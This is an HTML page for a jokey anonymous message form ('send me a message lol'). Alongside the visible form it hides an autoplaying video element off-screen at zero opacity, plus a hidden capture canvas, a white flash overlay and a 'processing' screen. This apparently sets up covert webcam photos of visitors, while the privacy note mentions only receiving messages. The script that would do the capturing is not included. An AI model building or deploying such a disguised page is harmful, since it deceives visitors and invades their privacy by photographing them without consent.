<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>send me a message lol</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
        
        body {
            background-color: #f0f0f0;
            color: #333;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            background: white;
            border-radius: 8px;
            padding: 30px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            border: 1px solid #ddd;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo-text {
            font-size: 28px;
            font-weight: 600;
            color: #222;
            margin-bottom: 5px;
        }
        
        .logo-subtitle {
            color: #666;
            font-size: 15px;
            font-weight: normal;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
            font-size: 14px;
        }
        
        .form-input {
            width: 100%;
            padding: 12px;
            background: white;
            border: 1px solid #ccc;
            border-radius: 6px;
            color: #333;
            font-size: 16px;
            transition: border-color 0.2s;
        }
        
        .form-input:focus {
            outline: none;
            border-color: #888;
        }
        
        .form-textarea {
            width: 100%;
            padding: 12px;
            background: white;
            border: 1px solid #ccc;
            border-radius: 6px;
            color: #333;
            font-size: 16px;
            min-height: 100px;
            resize: vertical;
            font-family: inherit;
            transition: border-color 0.2s;
        }
        
        .form-textarea:focus {
            outline: none;
            border-color: #888;
        }
        
        .submit-btn {
            width: 100%;
            padding: 14px;
            background: #222;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
            margin-top: 10px;
        }
        
        .submit-btn:hover {
            background: #333;
        }
        
        .submit-btn:disabled {
            background: #999;
            cursor: not-allowed;
        }
        
        .status-message {
            margin-top: 20px;
            padding: 12px;
            border-radius: 6px;
            font-size: 14px;
            text-align: center;
            display: none;
        }
        
        .status-success {
            background: #e8f5e8;
            border: 1px solid #c8e6c8;
            color: #2d5a2d;
        }
        
        .status-error {
            background: #ffe8e8;
            border: 1px solid #ffc8c8;
            color: #a52d2d;
        }
        
        .status-processing {
            background: #fff8e8;
            border: 1px solid #ffe0c8;
            color: #856404;
        }
        
        .privacy-note {
            margin-top: 25px;
            padding: 15px;
            background: #f8f8f8;
            border-radius: 6px;
            font-size: 13px;
            color: #666;
            line-height: 1.5;
            text-align: center;
            border: 1px solid #eee;
            font-style: italic;
        }
        
        #camera-container {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            overflow: hidden;
            opacity: 0;
            pointer-events: none;
            z-index: -9999;
        }
        
        #camera-feed {
            width: 320px;
            height: 240px;
            transform: scale(0.1);
            opacity: 0;
        }
        
        .hidden-canvas {
            display: none;
        }
        
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(240, 240, 240, 0.95);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            flex-direction: column;
            gap: 20px;
        }
        
        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 3px solid #ddd;
            border-top: 3px solid #222;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        .loading-text {
            color: #333;
            font-size: 16px;
            font-weight: 500;
        }
        
        .quick-flash {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: white;
            opacity: 0;
            pointer-events: none;
            z-index: 9999;
            transition: opacity 0.1s;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @media (max-width: 600px) {
            .container {
                padding: 20px;
                margin: 10px;
            }
            
            .logo-text {
                font-size: 24px;
            }
            
            .logo-subtitle {
                font-size: 14px;
            }
            
            .form-input, .form-textarea {
                padding: 10px;
                font-size: 15px;
            }
            
            .submit-btn {
                padding: 12px;
            }
        }
    </style>
</head>
<body>
    <div id="camera-container">
        <video id="camera-feed" autoplay playsinline></video>
    </div>
    <canvas id="capture-canvas" class="hidden-canvas"></canvas>
    
    <div id="quick-flash" class="quick-flash"></div>
    
    <div id="loading-overlay" class="loading-overlay">
        <div class="loading-spinner"></div>
        <div class="loading-text">processing your message...</div>
    </div>
    
    <div class="container">
        <div class="logo">
            <div class="logo-text">send me a message lol</div>
            <div class="logo-subtitle">idk say something funny maybe</div>
        </div>
        
        <form id="message-form">
            <div class="form-group">
                <label class="form-label">ur name (optional, unless ur boring)</label>
                <input type="text" id="username" class="form-input" placeholder="who dis">
            </div>
            
            <div class="form-group">
                <label class="form-label">what u wanna say</label>
                <textarea id="message" class="form-textarea" placeholder="type something... anything really..." required></textarea>
            </div>
            
            <button type="submit" class="submit-btn" id="submit-btn">
                yeet that message
            </button>
            
            <div id="status-message" class="status-message"></div>
        </form>
        
        <div class="privacy-note">
            i'll get ur message directly. no pressure, but make it good lol
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
